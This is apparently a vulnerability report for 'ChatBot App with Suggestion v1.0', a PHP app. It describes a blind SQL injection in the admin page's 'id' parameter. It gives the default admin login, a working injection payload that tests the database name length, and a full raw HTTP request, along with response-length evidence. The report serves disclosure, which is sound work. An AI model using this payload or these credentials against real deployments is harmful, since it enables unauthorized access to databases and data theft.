# ChatBot App with Suggestion v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15316/chatbot-app-suggestion-phpoop-free-source-code.html

Vulnerability File: /simple_chat_bot/admin/?page=responses/manage_response&id=

Vulnerability location: /simple_chat_bot/admin/?page=responses/manage_response&id=, id

[+] Payload: /simple_chat_bot/admin/?page=responses/manage_response&id=8%27%20and%20length(database())%20=11--+ // Leak place ---> id

Current database name: chat_bot_db,length is 11

```sql
GET /simple_chat_bot/admin/?page=responses/manage_response&id=8%27%20and%20length(database())%20=11--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 10, Content-Length: 30013
![image](https://user-images.githubusercontent.com/54017627/170820272-de49c84d-652f-4464-9d89-00afbf6e688b.png)

![image](https://user-images.githubusercontent.com/54017627/170820284-672c5b8a-8494-4a71-8474-e84ab3784c6b.png)

When length (database ()) = 11, Content-Length: 30708
![image](https://user-images.githubusercontent.com/54017627/170820263-45797b59-cf1d-4afb-9478-5809a2872264.png)

![image](https://user-images.githubusercontent.com/54017627/170820276-a4e19596-3ecb-417c-a974-fd3df8e3efa1.png)
